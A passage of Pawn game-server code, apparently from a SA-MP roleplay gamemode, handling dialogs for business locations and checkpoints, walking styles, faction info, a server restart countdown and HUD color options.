	            ShowPlayerDialog(playerid, DIALOG_LOCATIONS247LV, DIALOG_STYLE_LIST, "24/7 Store (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 1)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[29][bEntranceX], BizzInfo[29][bEntranceY], BizzInfo[29][bEntranceZ]);
	            format(string1,sizeof(string1),"Clothing Store (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSCLOTHINGLV, DIALOG_STYLE_LIST, "Clothing Store (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 2)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[21][bEntranceX], BizzInfo[21][bEntranceY], BizzInfo[21][bEntranceZ]);
	            format(string1,sizeof(string1),"Bank (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSBANKLV, DIALOG_STYLE_LIST, "Bank (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 3)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[4][bEntranceX], BizzInfo[4][bEntranceY], BizzInfo[4][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[54][bEntranceX], BizzInfo[54][bEntranceY], BizzInfo[54][bEntranceZ]);
	            format(string1,sizeof(string1),"Cluckin' Bell (%.1fm away)\nCluckin' Bell (%.1fm away)",Distance[1],Distance[2]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSCLUCKINLV, DIALOG_STYLE_LIST, "Cluckin' Bell (2 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 4)
	        {
	            new Float: Position[3];
    			new Float: Distance[5];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[17][bEntranceX], BizzInfo[17][bEntranceY], BizzInfo[17][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[18][bEntranceX], BizzInfo[18][bEntranceY], BizzInfo[18][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[19][bEntranceX], BizzInfo[19][bEntranceY], BizzInfo[19][bEntranceZ]);
	            Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[20][bEntranceX], BizzInfo[20][bEntranceY], BizzInfo[20][bEntranceZ]);
	            format(string1,sizeof(string1),"Burger Shot (%.1fm away)\nBurger Shot (%.1fm away)\nBurger Shot (%.1fm away)\nBurger Shot (%.1fm away)",Distance[1],Distance[2],Distance[3],Distance[4]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSBURGERLV, DIALOG_STYLE_LIST, "Burger Shot (4 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 5)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[22][bEntranceX], BizzInfo[22][bEntranceY], BizzInfo[22][bEntranceZ]);
	            format(string1,sizeof(string1),"Gun Shop (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSGSLV, DIALOG_STYLE_LIST, "Gun Shop (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 6)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[52][bEntranceX], BizzInfo[52][bEntranceY], BizzInfo[52][bEntranceZ]);
	            format(string1,sizeof(string1),"CNN (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSCNNLV, DIALOG_STYLE_LIST, "CNN (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 7)
	        {
	            new Float: Position[3];
    			new Float: Distance[7];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[45][bEntranceX], BizzInfo[45][bEntranceY], BizzInfo[45][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[46][bEntranceX], BizzInfo[46][bEntranceY], BizzInfo[46][bEntranceZ]);
	            Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[47][bEntranceX], BizzInfo[47][bEntranceY], BizzInfo[47][bEntranceZ]);
	            Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[48][bEntranceX], BizzInfo[48][bEntranceY], BizzInfo[48][bEntranceZ]);
	            Distance[5] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[49][bEntranceX], BizzInfo[49][bEntranceY], BizzInfo[49][bEntranceZ]);
	            Distance[6] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[50][bEntranceX], BizzInfo[50][bEntranceY], BizzInfo[50][bEntranceZ]);
	            format(string1,sizeof(string1),"Gas Station (%.1fm away)\nGas Station (%.1fm away)\nGas Station (%.1fm away)\nGas Station (%.1fm away)\nGas Station (%.1fm away)\nGas Station (%.1fm away)",Distance[1],Distance[2],Distance[3],Distance[4],Distance[5],Distance[6]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSGASLV, DIALOG_STYLE_LIST, "Gas Station (6 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 8)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[8][bEntranceX], BizzInfo[8][bEntranceY], BizzInfo[8][bEntranceZ]);
	            format(string1,sizeof(string1),"Casino (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSCASINOLV, DIALOG_STYLE_LIST, "Casino (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 9)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[23][bEntranceX], BizzInfo[23][bEntranceY], BizzInfo[23][bEntranceZ]);
	            format(string1,sizeof(string1),"Sex Shop (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSSEXLV, DIALOG_STYLE_LIST, "Sex Shop (1 business) Locations", string1, "Find", "Back");
			}
			if(listitem == 10)
	        {
	            new Float: Position[3];
    			new Float: Distance[3];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[40][bEntranceX], BizzInfo[40][bEntranceY], BizzInfo[40][bEntranceZ]);
	            Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[41][bEntranceX], BizzInfo[41][bEntranceY], BizzInfo[41][bEntranceZ]);
	            format(string1,sizeof(string1),"Pay N Spray (%.1fm away)\nPay N Spray (%.1fm away)",Distance[1],Distance[2]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSPNSLV, DIALOG_STYLE_LIST, "Pay N Spray (2 businesses) Locations", string1, "Find", "Back");
			}
			if(listitem == 11)
	        {
	            new Float: Position[3];
    			new Float: Distance[2];
	            new string1[MAX_STRING];
	            GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	            Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], BizzInfo[51][bEntranceX], BizzInfo[51][bEntranceY], BizzInfo[51][bEntranceZ]);
	            format(string1,sizeof(string1),"Car Mod Shop (%.1fm away)",Distance[1]);
	            ShowPlayerDialog(playerid, DIALOG_LOCATIONSMODLV, DIALOG_STYLE_LIST, "Car Mod Shop (1 business) Locations", string1, "Find", "Back");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONS247LS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[10][bEntranceX],BizzInfo[10][bEntranceY],BizzInfo[10][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[11][bEntranceX],BizzInfo[11][bEntranceY],BizzInfo[11][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[12][bEntranceX],BizzInfo[12][bEntranceY],BizzInfo[12][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[13][bEntranceX],BizzInfo[13][bEntranceY],BizzInfo[13][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 4)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[14][bEntranceX],BizzInfo[14][bEntranceY],BizzInfo[14][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSCLOTHINGLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[30][bEntranceX],BizzInfo[30][bEntranceY],BizzInfo[30][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[32][bEntranceX],BizzInfo[32][bEntranceY],BizzInfo[32][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[53][bEntranceX],BizzInfo[53][bEntranceY],BizzInfo[53][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSRENTLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[31][bEntranceX],BizzInfo[31][bEntranceY],BizzInfo[31][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSSEXLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[7][bEntranceX],BizzInfo[7][bEntranceY],BizzInfo[7][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSMODLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[38][bEntranceX],BizzInfo[38][bEntranceY],BizzInfo[38][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[39][bEntranceX],BizzInfo[39][bEntranceY],BizzInfo[39][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSCLOTHINGLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[29][bEntranceX],BizzInfo[29][bEntranceY],BizzInfo[29][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSCLUCKINLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[4][bEntranceX],BizzInfo[4][bEntranceY],BizzInfo[4][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[54][bEntranceX],BizzInfo[54][bEntranceY],BizzInfo[54][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSCASINOLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[8][bEntranceX],BizzInfo[8][bEntranceY],BizzInfo[8][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSSEXLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[23][bEntranceX],BizzInfo[23][bEntranceY],BizzInfo[23][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSMODLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[51][bEntranceX],BizzInfo[51][bEntranceY],BizzInfo[51][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSBARLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[3][bEntranceX],BizzInfo[3][bEntranceY],BizzInfo[3][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[4][bEntranceX],BizzInfo[4][bEntranceY],BizzInfo[4][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[5][bEntranceX],BizzInfo[5][bEntranceY],BizzInfo[5][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSBANKLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[1][bEntranceX],BizzInfo[1][bEntranceY],BizzInfo[1][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[27][bEntranceX],BizzInfo[27][bEntranceY],BizzInfo[27][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSGYMLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[25][bEntranceX],BizzInfo[25][bEntranceY],BizzInfo[25][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSBURGERLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[15][bEntranceX],BizzInfo[15][bEntranceY],BizzInfo[15][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[16][bEntranceX],BizzInfo[16][bEntranceY],BizzInfo[16][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSPIZZALS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[26][bEntranceX],BizzInfo[26][bEntranceY],BizzInfo[26][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSGSLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[2][bEntranceX],BizzInfo[2][bEntranceY],BizzInfo[2][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[9][bEntranceX],BizzInfo[9][bEntranceY],BizzInfo[9][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSCNNLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[28][bEntranceX],BizzInfo[28][bEntranceY],BizzInfo[28][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSGASLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[33][bEntranceX],BizzInfo[33][bEntranceY],BizzInfo[33][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[42][bEntranceX],BizzInfo[42][bEntranceY],BizzInfo[42][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[43][bEntranceX],BizzInfo[43][bEntranceY],BizzInfo[43][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[44][bEntranceX],BizzInfo[44][bEntranceY],BizzInfo[44][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSPNSLS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[34][bEntranceX],BizzInfo[34][bEntranceY],BizzInfo[34][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[35][bEntranceX],BizzInfo[35][bEntranceY],BizzInfo[35][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[36][bEntranceX],BizzInfo[36][bEntranceY],BizzInfo[36][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[37][bEntranceX],BizzInfo[37][bEntranceY],BizzInfo[37][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONS247LV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[24][bEntranceX],BizzInfo[24][bEntranceY],BizzInfo[24][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSBANKLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[21][bEntranceX],BizzInfo[21][bEntranceY],BizzInfo[21][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSBURGERLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[17][bEntranceX],BizzInfo[17][bEntranceY],BizzInfo[17][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[18][bEntranceX],BizzInfo[18][bEntranceY],BizzInfo[18][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[19][bEntranceX],BizzInfo[19][bEntranceY],BizzInfo[19][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[20][bEntranceX],BizzInfo[20][bEntranceY],BizzInfo[20][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSGSLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[22][bEntranceX],BizzInfo[22][bEntranceY],BizzInfo[22][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSCNNLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[52][bEntranceX],BizzInfo[52][bEntranceY],BizzInfo[52][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSGASLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[45][bEntranceX],BizzInfo[45][bEntranceY],BizzInfo[45][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[42][bEntranceX],BizzInfo[42][bEntranceY],BizzInfo[42][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[43][bEntranceX],BizzInfo[43][bEntranceY],BizzInfo[43][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 3)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[44][bEntranceX],BizzInfo[44][bEntranceY],BizzInfo[44][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 4)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[45][bEntranceX],BizzInfo[45][bEntranceY],BizzInfo[45][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 5)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[46][bEntranceX],BizzInfo[46][bEntranceY],BizzInfo[46][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSPNSLV)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[40][bEntranceX],BizzInfo[40][bEntranceY],BizzInfo[40][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[41][bEntranceX],BizzInfo[41][bEntranceY],BizzInfo[41][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_LOCATIONSMODS)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[38][bEntranceX],BizzInfo[38][bEntranceY],BizzInfo[38][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			/*if(listitem == 1)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[52][bEntranceX],BizzInfo[52][bEntranceY],BizzInfo[52][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerCheckpoint(playerid,BizzInfo[39][bEntranceX],BizzInfo[39][bEntranceY],BizzInfo[39][bEntranceZ],4.0);
			    CP[playerid] = 43;
			    return 1;
			}*/
		}
		return 1;
	}
	if(dialogid == DIALOG_WALKSTYLE)
	{
		if(response)
		{
			if(listitem == 0)
			{
				SetPlayerWalkingStyle (playerid, WALK_NORMAL);
			    return 1;
			}
			if(listitem == 1)
			{
				SetPlayerWalkingStyle (playerid, WALK_PED);
			    return 1;
			}
			if(listitem == 2)
			{
			    SetPlayerWalkingStyle (playerid, WALK_GANGSTA);
			    return 1;
			}
			if(listitem == 3)
			{
				SetPlayerWalkingStyle (playerid, WALK_GANGSTA2);
			    return 1;
			}
			if(listitem == 4)
			{
			    SetPlayerWalkingStyle (playerid, WALK_OLD);
			    return 1;
			}
			if(listitem == 5)
			{
			    SetPlayerWalkingStyle (playerid, WALK_FAT_OLD);
			    return 1;
			}
			if(listitem == 6)
			{
			    SetPlayerWalkingStyle (playerid, WALK_FAT);
			    return 1;
			}
			if(listitem == 7)
			{
			    SetPlayerWalkingStyle (playerid, WALK_LADY);
			    return 1;
			}
			if(listitem == 8)
			{
			    SetPlayerWalkingStyle (playerid, WALK_LADY2);
			    return 1;
			}
			if(listitem == 9)
			{
			    SetPlayerWalkingStyle (playerid, WALK_WHORE);
			    return 1;
			}
			if(listitem == 10)
			{
			    SetPlayerWalkingStyle (playerid, WALK_WHORE2);
			    return 1;
			}
			if(listitem == 11)
			{
			    SetPlayerWalkingStyle (playerid, WALK_DRUNK);
			    return 1;
			}
			if(listitem == 12)
			{
			    SetPlayerWalkingStyle (playerid, WALK_BLIND);
			    return 1;
			}
			if(listitem == 13)
			{
			    SetPlayerWalkingStyle (playerid, WALK_DEFAULT);
			    return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_FACTIONS)
	{
	    if(response)
		{
			new f = listitem+1;
			SelFac[playerid] = f;
			if(f >= 7)
			{
				f = f+1;
			}
			new szDialogs[512], titledialog[512], lead[MAX_PLAYER_NAME], query[256], result[100];
			format(lead, MAX_PLAYER_NAME, "None");
			format(query, 256, "SELECT * FROM `users` WHERE `Member` = '%d' AND `Rank` = '7'", f);
			new Cache: masta = mysql_query(SQL, query);
			if(cache_get_row_count() >= 1)
			{
				cache_get_field_content(0, "name", result);
				format(lead, MAX_PLAYER_NAME, result);
			}
			cache_delete(masta);
			new onmembers;
			foreach(Player, i)
			{
				if(PlayerInfo[i][pMember] == f)
				{
					onmembers++;
				}
			}
			if(strlen(lead) >= 1 && strcmp(lead, "None", true))
			{
				format(szDialogs, 512, "ID: %d\nFaction name: %s\nFaction leader: %s\n\nTotal members: %d\nMaximum members: %d\nOnline members: %d", f, DynamicFactions[f][fName], lead, GetFactionMembers(f), DynamicFactions[f][fMaxMembers], onmembers);
			}
			else
			{
				format(szDialogs, 512, "ID: %d\nFaction name: %s\nLeader: None\n\nTotal members: %d\nMaximum members: %d\nOnline members: %d", f, DynamicFactions[f][fName], GetFactionMembers(f), DynamicFactions[f][fMaxMembers], onmembers);
			}
			format(titledialog,sizeof(titledialog),"%s", DynamicFactions[f][fName]);
			ShowPlayerDialog(playerid, DIALOG_FACTIONS2, DIALOG_STYLE_MSGBOX, titledialog, szDialogs, "Back", "Exit");
		}
		else
		{
		    hidePlayerDialog(playerid);
			SelFac[playerid] = 0;
		}
	}
	if(dialogid == DIALOG_FACTIONS2)
	{
	    if(response)
	    {
	        SelFac[playerid] = 0;
	        ShowFactions(playerid);
		}
		else
		{
		    hidePlayerDialog(playerid);
			SelFac[playerid] = 0;
		}
	}
	if(dialogid == DIALOG_GMX)
	{
		if(response)
		{
		    SendClientMessageToAll(COLOR_YELLOW, "---- SERVER RESTART ----");
			SendClientMessageToAll(COLOR_RED, "The server will be restarted in 60 seconds.");
		    foreach(Player, x)
			{
				OnPlayerDateUpdateX2(x);
				Update(x, pPayDayx);
				Update(x, pPayCheckx);
				Update(x, pFpunishx);
				Update(x, pConnectTimex);
				Update(x, pLawyerx);
				Update(x, pBank);
				Update(x, pCashx);
				Update(x, pRP);
				Update(x, pJailTimex);
				Update(x, pLevelx);
				if(PlayerInfo[x][pAdmin] > 4)
				{
				    SendClientMessage(x, COLOR_GREY, "- Player data saved.");
				    SendClientMessage(x, COLOR_GREY, "- House data saved.");
				    SendClientMessage(x, COLOR_GREY, "- Group data saved.");
				    SendClientMessage(x, COLOR_GREY, "- Business data saved.");
				    SendClientMessage(x, COLOR_GREY, "- Server asset data saved.");
				    SendClientMessage(x, COLOR_RED, "Restarting timer activated.");
				}
			}
			iGMXTick = 63;
			iGMXTimer = SetTimer("restartTimer", 1000, true);
		}
		else if(!response)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Restart attempt canned.");
		}
		return 1;
	}
	if(dialogid == DIALOG_HUD)
	{
	    if(response)
		{
		    new stringg[256];
		    if(listitem == 0)
		    {
		        format(stringg,sizeof(stringg),"Disable\n{C0C0C0}Grey\n{FF0000}Red\n{00FF00}Green\n{0000FF}Blue\n{FFFF00}Yellow");
		        ShowPlayerDialog(playerid,DIALOG_HUD1,DIALOG_STYLE_LIST, "HUD Options: HP", stringg, "Select","Close");
			}
			if(listitem == 1)
		    {
		        format(stringg,sizeof(stringg),"Disable\n{C0C0C0}Grey\n{FF0000}Red\n{00FF00}Green\n{0000FF}Blue\n{FFFF00}Yellow");
		        ShowPlayerDialog(playerid,DIALOG_HUD2,DIALOG_STYLE_LIST, "HUD Options: Armour", stringg, "Select","Close");
			}
			if(listitem == 2)
		    {
